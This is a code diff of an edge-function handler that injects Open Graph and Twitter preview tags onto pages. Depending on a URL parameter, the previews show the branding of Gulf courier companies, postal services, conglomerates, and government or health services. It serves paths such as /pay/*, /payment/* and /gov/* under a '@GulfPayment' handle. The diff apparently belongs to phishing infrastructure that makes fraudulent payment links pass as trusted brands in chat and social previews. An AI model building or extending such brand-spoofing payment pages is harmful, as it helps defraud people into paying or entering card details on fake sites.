@@ -1,4 +1,4 @@
-export default async function handler(request: Request, context: { next: () => Promise<Response> }) {
+export default async function handler(request: Request, context: any) {
   try {
     const url = new URL(request.url);
     const path = url.pathname;
@@ -50,8 +50,6 @@ export default async function handler(request: Request, context: { next: () => P
       company = url.searchParams.get('service') || 'logistics';
     }
 
-    console.log('OG Injector:', { path, company, serviceType });
-
     const response = await context.next();
     const html = await response.text();
     const origin = url.origin;
@@ -61,10 +59,6 @@ export default async function handler(request: Request, context: { next: () => P
       // Shipping services
       'aramex': `${origin}/og-aramex.jpg`,
       'dhl': `${origin}/og-dhl.jpg`,
-      'dhlkw': `${origin}/og-dhl.jpg`,
-      'dhlqa': `${origin}/og-dhl.jpg`,
-      'dhlom': `${origin}/og-dhl.jpg`,
-      'dhlbh': `${origin}/og-dhl.jpg`,
       'fedex': `${origin}/og-fedex.jpg`,
       'ups': `${origin}/og-ups.jpg`,
       'empost': `${origin}/og-empost.jpg`,
@@ -76,14 +70,6 @@ export default async function handler(request: Request, context: { next: () => P
       'qpost': `${origin}/og-qpost.jpg`,
       'omanpost': `${origin}/og-omanpost.jpg`,
       'bahpost': `${origin}/og-bahpost.jpg`,
-      'albaraka': `${origin}/og-albaraka.jpg`,
-      'alfuttaim': `${origin}/og-alfuttaim.jpg`,
-      'alshaya': `${origin}/og-alshaya.jpg`,
-      'shipco': `${origin}/og-shipco.jpg`,
-      'hellmann': `${origin}/og-hellmann.jpg`,
-      'dsv': `${origin}/og-dsv.jpg`,
-      'jinaken': `${origin}/og-jinaken.jpg`,
-      'genacom': `${origin}/og-genacom.jpg`,
       
       // Service type defaults
       'chalet': `${origin}/og-chalet.jpg`,
@@ -95,7 +81,6 @@ export default async function handler(request: Request, context: { next: () => P
 
     // Service display names
     const serviceNames: Record<string, string> = {
-      // Shipping
       'aramex': 'أرامكس - Aramex',
       'dhl': 'دي إتش إل - DHL',
       'fedex': 'فيديكس - FedEx',
@@ -104,21 +89,6 @@ export default async function handler(request: Request, context: { next: () => P
       'smsa': 'سمسا',
       'zajil': 'زاجل',
       'naqel': 'ناقل',
-      'saudipost': 'البريد السعودي',
-      'kwpost': 'البريد الكويتي',
-      'qpost': 'البريد القطري',
-      'omanpost': 'البريد العُماني',
-      'bahpost': 'البريد البحريني',
-      'albaraka': 'مجموعة البركة',
-      'alfuttaim': 'مجموعة الفطيم',
-      'alshaya': 'مجموعة الشايع',
-      'shipco': 'شركة الشحن العالمية',
-      'hellmann': 'هايلمان العالمية',
-      'dsv': 'دي إس في',
-      'jinaken': 'جيناكم',
-      'genacom': 'جيناكم',
-      
-      // Service types
       'chalet': 'حجز الشاليهات',
       'health': 'الخدمات الصحية',
       'government': 'الخدمات الحكومية',
@@ -163,15 +133,10 @@ export default async function handler(request: Request, context: { next: () => P
 
     <!-- Twitter Card -->
     <meta name="twitter:card" content="summary_large_image" />
-    <meta name="twitter:site" content="@GulfPayment" />
     <meta name="twitter:title" content="${ogTitle}" />
     <meta name="twitter:description" content="${ogDescription}" />
     <meta name="twitter:image" content="${ogImage}" />
     <meta name="twitter:image:alt" content="${serviceName}" />
-    
-    <!-- WhatsApp specific -->
-    <meta property="og:image:type" content="image/jpeg" />
-    <meta property="og:determiner" content="the" />
     `;
 
     // Remove existing OG and Twitter tags
@@ -185,8 +150,6 @@ export default async function handler(request: Request, context: { next: () => P
       /<head[^>]*>/i,
       (match) => `${match}\n${ogTags.trim()}`
     );
-
-    console.log('OG Injector: Tags injected', { company, serviceType, serviceName, ogImage });
 
     return new Response(modifiedHtml, {
       status: response.status,
@@ -204,3 +167,5 @@ export default async function handler(request: Request, context: { next: () => P
     return context.next();
   }
 }
+
+export const config = { path: ["/r/*", "/pay/*", "/payment/*", "/booking/*", "/gov/*", "/health-service/*", "/logistics-service/*"] };
